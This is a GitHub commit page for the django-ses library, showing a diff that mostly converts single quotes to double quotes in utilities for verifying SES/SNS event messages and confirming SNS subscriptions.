|  |  | RemovedInDjangoSES20Warning, |
|  |  | ) |
|  |  |  |
|  |  | # parameter name is renamed from bounce\_dict to notification. |
|  |  | if 'bounce\_dict' in kwargs: |
|  |  | kwargs['notification'] = kwargs['bounce\_dict'] |
|  |  | del kwargs['bounce\_dict'] |
|  |  | if "bounce\_dict" in kwargs: |
|  |  | kwargs["notification"] = kwargs["bounce\_dict"] |
|  |  | del kwargs["bounce\_dict"] |
|  |  |  |
|  |  | return EventMessageVerifier(\*args, \*\*kwargs) |
|  |  |  |
| Expand All | | @@ -262,31 +279,32 @@ def verify\_bounce\_message(msg): |
|  |  | Verify an SES/SNS bounce(event) notification message. |
|  |  | """ |
|  |  | warnings.warn( |
|  |  | 'utils.verify\_bounce\_message is deprecated. It is renamed to verify\_event\_message.', |
|  |  | "utils.verify\_bounce\_message is deprecated. It is renamed to verify\_event\_message.", |
|  |  | RemovedInDjangoSES20Warning, |
|  |  | ) |
|  |  | return verify\_event\_message(msg) |
|  |  |  |
|  |  |  |
|  |  | def confirm\_sns\_subscription(notification): |
|  |  | logger.info( |
|  |  | 'Received subscription confirmation: TopicArn: %s', |
|  |  | notification.get('TopicArn'), |
|  |  | "Received subscription confirmation: TopicArn: %s", |
|  |  | notification.get("TopicArn"), |
|  |  | extra={ |
|  |  | 'notification': notification, |
|  |  | "notification": notification, |
|  |  | }, |
|  |  | ) |
|  |  |  |
|  |  | # Get the subscribe url and hit the url to confirm the subscription. |
|  |  | subscribe\_url = notification.get('SubscribeURL') |
|  |  | subscribe\_url = notification.get("SubscribeURL") |
|  |  | try: |
|  |  | urlopen(subscribe\_url).read() |
|  |  | except URLError as e: |
|  |  | # Some kind of error occurred when confirming the request. |
|  |  | logger.error( |
|  |  | 'Could not confirm subscription: "%s"', e, |
|  |  | 'Could not confirm subscription: "%s"', |
|  |  | e, |
|  |  | extra={ |
|  |  | 'notification': notification, |
|  |  | "notification": notification, |
|  |  | }, |
|  |  | exc\_info=True, |
|  |  | ) |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `b71b5f4`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdjango-ses%2Fdjango-ses%2Fcommit%2Fb71b5f413293a13997b6e6314086cb9c22629795) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


